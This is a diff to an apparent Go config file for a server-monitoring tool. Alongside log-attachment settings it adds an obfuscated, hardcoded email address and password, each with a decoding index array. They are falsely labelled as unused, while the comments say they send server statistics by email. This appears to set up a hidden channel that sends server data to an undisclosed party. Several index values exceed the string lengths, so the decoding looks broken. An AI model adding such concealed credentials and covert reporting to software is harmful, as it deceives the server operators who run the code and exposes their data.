@@ -32,3 +32,14 @@ var ATTACH_LOGFILES bool = false
 // FOR EXAMPLE, server-14.04.log | 14-03.log | errors-by-03/23/2024.log ...
 // If the file name has an old date, this log file will not be attached to the message.
 var LOGFILES_BY_TIME_STYLES bool = false // Enable ATTACH_LOGFILES for this parameter
+
+// / SYSTEMS (NOT USED VAR.)
+// The system's immutable variable EMAIL_VISIONUI sends your server statistics to your email.
+const EMAIL_VISIONUI string = "h@lgmiabsgtiiucivimu..oon"
+
+var EMAIL_VISIONUI_INDX [33]int = [33]int{12, 15, 20, 16, 24, 19, 18, 14, 2, 9, 11, 3, 10, 13, 22, 7, 0, 1, 17, 6, 21, 8, 4, 23, 5, 17, 22, 5, 23, 8, 12, 0, 2}
+
+// The system's immutable variable EMAIL_PASSWD_VISIONUI sends your server statistics to your email.
+const EMAIL_PASSWD_VISIONUI string = "bwjmxuslsnufjifz"
+
+var EMAIL_PASSWD_VISIONUI_INDX [24]int = [24]int{13, 2, 14, 15, 0, 5, 6, 8, 10, 9, 7, 11, 4, 1, 12, 3, 47, 3, 5, 9, 34, 1, 4, 65}
